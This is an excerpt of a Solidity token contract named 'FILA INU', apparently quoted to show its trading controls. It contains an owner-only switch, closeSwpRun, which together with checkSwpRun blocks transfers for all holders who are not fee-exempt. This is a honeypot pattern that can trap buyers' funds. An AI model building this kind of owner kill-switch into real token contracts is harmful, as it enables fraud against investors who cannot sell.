...
contract FILAINU is IERC20, Ownable {
  string private constant _name = "FILA INU";
  string private constant _symbol = "FILAINU";
  ...
  address internal constant marketing_receiver =
      0xB4146B6F53fD092bf5d5A301B2Cbb3a5b04b7A5a;
  ...
  function closeSwpRun() external onlyOwner {
        swpRun = false;
    }
  ...
  function checkSwpRun(
        address sender,
        address recipient
    ) internal view {
        if (!isFeeExempt[sender] && !isFeeExempt[recipient]) {
            require(swpRun, "swpRun");
        }
    }
